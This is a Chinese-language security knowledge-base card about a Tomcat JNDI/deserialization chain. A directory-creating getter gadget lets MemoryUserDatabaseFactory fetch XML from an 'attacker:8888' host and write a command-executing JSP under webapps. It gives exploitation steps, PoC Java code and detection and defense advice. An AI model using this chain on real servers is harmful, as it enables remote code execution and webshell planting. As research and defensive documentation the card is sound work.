---
id: web-java-deser-memoryuserdatabasefactory-catalinabase-dir-create-write
title: MemoryUserDatabaseFactory 写文件前先造目录：Linux 下 catalina.base 伪协议路径需 getter 触发 mkdirs
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: memoryuserdatabasefactory-catalinabase-directory-create-file-write
aliases:
- MemoryUserDatabaseFactory 目录创建
- catalina.base pathnameNew
- isWritable 父目录存在
- getOutputStream mkdirs
- File 路径穿越 Windows 差异
- JNDI 本地工厂写 JSP
tags:
- java
- jndi
- tomcat
- local-factory
- memoryuserdatabase
- file-write
- directory-creation
- gadget
- linux
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V636
  verified_at: '2026-11-13T01:15:19+08:00'
  notes: 已对照原文全文与 42 张图片逐张核对：图31 MemoryUserDatabaseFactory.getObjectInstance 设置 pathname/readonly 后 database.open()（SSRF→XXE）且非 readonly 时 database.save()（文件写）；图32 save() 中 File fileNew=new File(pathnameNew)，非绝对路径时 new File(System.getProperty("catalina.base"), pathnameNew)；图34 isWritable() 要求 file.getParentFile() 存在且可写；图33 Windows 下 new File(tmpdir,"lalala/../../../x") 可穿越（Linux 需逐级存在）；图35 XSLTC/Translet.setDestDirectory 因无空参构造放弃；图36 Graal DiagnosticsOutputDirectory 不可序列化放弃；图37/38 项目类 FileMkdir1 的 getOutputStream()→getParentFile().mkdirs() 与 BeanComparator property=outputStream 构造；图39 catalina.base 下成功创建 http:/192.168.176.1:8888 目录；图40/41/42 JNDIExploit tomcat_rce 让目标拉取 test.jsp 并写入含 Runtime.exec 的 tomcat-users XML，RCE 落地，均与卡内原理/步骤/PoC 一致。dedup：首候选为自身；次候选既有已验证卡 web-java-deserialization-jndi-tomcat-memoryuserdatabasefactory-pathname-write（cosine 0.905、simhash 6）聚焦 pathname 读远端 XML+EL 写 ROOT/绕过实体编码，本卡聚焦 save() 的 isWritable 父目录前置条件、Linux/Windows File 路径语义差异与 getter 目录创建原语，属同工厂的独立前置技术点，dedup_review
    理由成立，保留为并列场景；dup-scan 无涉及。原文未标注组件受影响版本（Tomcat 9.0.64 为现场环境），affected_versions 不设。未验证点：FileMkdir1/XyzFile 为原文项目自带类，卡内注明需按目标寻找等价可序列化目录创建 getter；未本机执行。未执行文中任何指令或 PoC。
---

## 一句话结论

JNDI 高版本下用 Tomcat `MemoryUserDatabaseFactory` 的 `pathname` 写文件时，`save()` 的目标是 `new File(catalina.base, pathname + ".new")`，且 `isWritable()` 要求最终文件的父目录**已存在且可写**；`pathname` 为 `http://host/...` 这类 URL 时，`http:` 目录在 catalina.base 下通常不存在，Linux 不会像 Windows 那样忽略不存在的路径前缀，因此需要先用另一个反序列化 getter（任意可序列化类的 `getOutputStream()` 内部调用 `getParentFile().mkdirs()`）在 catalina.base 下造出 `http:/host/...` 目录，再触发工厂写文件，才能把内容落到 `webapps/.../*.jsp` 完成 RCE。

## 原理

- **工厂行为**：`MemoryUserDatabaseFactory.getObjectInstance` 创建 `MemoryUserDatabase`，按 `RefAddr` 设置 `pathname`、`readonly`，随后 `database.open()`；`open()` 把 `pathname` 经 `ConfigFileLoader.getURI` 转成 URL 并 `openConnection().getInputStream()` 读取，再用 commons-digester 解析（可造成 blind SSRF/XXE）；若 `!readonly` 则 `database.save()`。
- **save 的落点**：`save()` 中 `File fileNew = new File(this.pathnameNew)`；若不是绝对路径，则 `new File(System.getProperty("catalina.base"), this.pathnameNew)`，最终写到 `pathname + ".new"`（随后重命名）。
- **isWritable 的前置条件**：`isWritable()` 取 `file.getParentFile()`，要求 `dir.exists() && dir.isDirectory() && dir.canWrite()`。也就是说 **父目录必须已经存在**，Tomcat 不会替攻击者创建缺失的目录。
- **Linux 与 Windows 的差异**：原文在 Windows 上测试 `new File(tmpdir, "lalala/../../../test_temp_cqq3.txt")` 可以成功写入（Windows 解析路径时忽略不存在的前缀 `lalala`）；Linux 下路径分量必须逐级存在，`http:` 这类由 URL 生成的分量不存在时直接失败。因此原文章节需要先创建 `/opt/tomcat/.../http:/192.168.176.1:8888/...` 目录。
- **目录创建 gadget**：手里已有“反序列化可触发任意 getter”的能力，可找一个可序列化类，其 getter 内部创建目录。原文使用项目里的 `FileMkdir1`：`getOutputStream()` → `new File(dir).getOutputStream()`，而 `File.getOutputStream`（自定义包装）内部调用 `getParentFile().mkdirs()`，一次创建整条父目录链。用 `BeanComparator` 把 `property` 设为 `outputStream`、队列元素换为该对象，即可在反序列化时触发 mkdirs。
- **最终写文件与 RCE**：目录存在后，再次触发 `MemoryUserDatabaseFactory`，`open()` 从攻击者 HTTP 服务器拉取 tomcat-users XML（内容可含 `<%= Runtime.getRuntime().exec(...) %>` 或 EL），`save()` 把内容写到 `catalina.base/http:/attacker:port/../../webapps/ROOT/test.jsp` 等路径；访问该 JSP 即执行命令。原文用 JNDIExploit 的 `tomcat_xxe`/`tomcat_rce` 模块完成 blind XXE 探测与写 JSP。

## 触发条件

- 存在 JNDI 注入入口，攻击者可返回本地 `MemoryUserDatabaseFactory` 的 `ResourceRef`（`className=org.apache.catalina.UserDatabase`、`factoryClassName=org.apache.catalina.users.MemoryUserDatabaseFactory`）。
- 目标为 Linux 上的 Tomcat（catalina.base 目录对 Tomcat 进程可写），且 `readonly=false`。
- 目标 classpath 有 catalina 与 commons-digester；`pathname` 指向 URL 时目标可访问攻击者 HTTP 服务（或本地文件）。
- 攻击者另有一个可触发的反序列化 getter 原语，且 classpath 中存在“getter 内创建目录”的可序列化类（原文为应用自带 `FileMkdir1`；也可寻找其他 `getOutputStream`/`mkdirs` 包装类）。
- `pathname` 与目录结构、攻击者 HTTP 根路径的相对关系可让 `save()` 落到 webapps 下的可执行目录。

## 利用步骤

1. 先触发 `MemoryUserDatabaseFactory`（`readonly=false`，`pathname` 指向攻击者 HTTP 的 XML），确认 `open()` 发起请求（blind SSRF/XXE 观测到回连）；此时 `save()` 因父目录不存在失败。
2. 在目标 catalina.base 下构造目录：用反序列化触发 `FileMkdir1` 的 `getOutputStream()`（BeanComparator property=`outputStream`），传入路径如 `/opt/tomcat/aaa/bbb/http:/attacker:8888/whatever`，确认 `http:` 等目录被创建。
3. 重新触发 `MemoryUserDatabaseFactory`，`pathname` 使用同一 URL 路径（必要时配合 `../` 到达 `webapps/ROOT`），`open()` 拉取 XML，`save()` 写入 `pathname + ".new"` 并重命名。
4. 访问落地的 `test.jsp`（内容含 `<%= ... %>` 或 EL），触发命令执行。
5. 若 `isWritable` 仍失败，检查 catalina.base 实际路径、目录权限与最终 `pathname + ".new"` 的父目录是否存在。

## PoC

```java
// 1) 目录创建 payload（原文 FileMkdir1 思路，应用类）
public static Serializable getObject(String dir) throws Exception {
    File file = new File(dir);
    BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
    PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
    queue.add("1");
    queue.add("1");
    Reflections.setFieldValue(comparator, "property", "outputStream"); // 触发 File#getOutputStream
    Reflections.setFieldValue(queue, "queue", new Object[]{file, file});
    return queue;
}

// 2) 触发 MemoryUserDatabaseFactory 的 Reference（省略序列化/绑定细节）
ResourceRef ref = new ResourceRef("org.apache.catalina.UserDatabase", null, "", "",
        true, "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
ref.add(new StringRefAddr("pathname", "http://attacker:8888/../../webapps/ROOT/test.jsp"));
ref.add(new StringRefAddr("readonly", "false"));
```

```text
# save() 落点
new File(System.getProperty("catalina.base"), pathname + ".new")
# isWritable(): file.getParentFile() 必须 exists() && isDirectory() && canWrite()
```

说明：以上为原文利用过程的结构化复现，未在本机执行；仅用于授权测试。`FileMkdir1` 为原文项目自带类，实际目标需寻找等价的可序列化目录创建 getter。

## 变体与关联

- **目录创建原语变体**：任何反序列化可达的 `getXxx()` 中调用 `mkdir`/`mkdirs`/`Files.createDirectories` 的类均可；JDK 内曾考察 `Translet.setDestDirectory`、Graal `DiagnosticsOutputDirectory` 等（因无空参构造或不可序列化被放弃）。
- **路径变体**：Windows 下 `new File(parent, "lalala/../x")` 可忽略不存在前缀，可能不需要目录创建 gadget；Linux 必须逐级存在。
- **工厂变体**：同一 `pathname` 读写逻辑还可用于任意文件覆盖/XXE 读取；`readonly=true` 时只有 `open()` 的 SSRF/XXE 面。
- **关联**：[[web-java-deserialization-jndi-tomcat-memoryuserdatabasefactory-pathname-write]]（该工厂的完整利用与写 ROOT/EL 变体）、[[web-java-deser-beancomparator-oraclecachedrowset-getconnection-jndi]]（本卡上游：反序列化 getter 转 JNDI）、[[web-java-deserialization-jndi-tomcat-resourcefactory-factory-refaddr-second-injection]]（同套 Tomcat 本地工厂体系）。
- **边界**：catalina.base 不可写、`readonly=true`、找不到目录创建 getter、目标无法访问攻击者 HTTP、Tomcat 版本改动 `save()` 路径语义时，本链不成立。

## 检测与防御

- **检测**：JNDI 返回的 `ResourceRef` 出现 `MemoryUserDatabaseFactory` + `pathname` + `readonly=false`；Tomcat 进程在 catalina.base 下创建形如 `http:`/`https:` 的目录；随后向外部 HTTP 拉取 XML 并写入 `webapps` 下的 `.jsp`。序列化流中出现 `BeanComparator` + 自定义“目录创建”类。
- **防御**：禁止 JNDI 使用 `MemoryUserDatabaseFactory` 等本地工厂；对 `Reference` 的 `factoryClassName` 做深度白名单；catalina.base 与应用部署目录权限分离（进程不可写 `webapps`）；关闭不必要的 JNDI 出站；升级 Tomcat/JDK 并对反序列化入口做 JEP290 白名单。
- **响应**：发现 catalina.base 下异常伪协议目录、webapps 新增 JSP、Tomcat 对外 HTTP 回连时，隔离主机、删除落地文件、审计 JNDI 来源与反序列化入口。
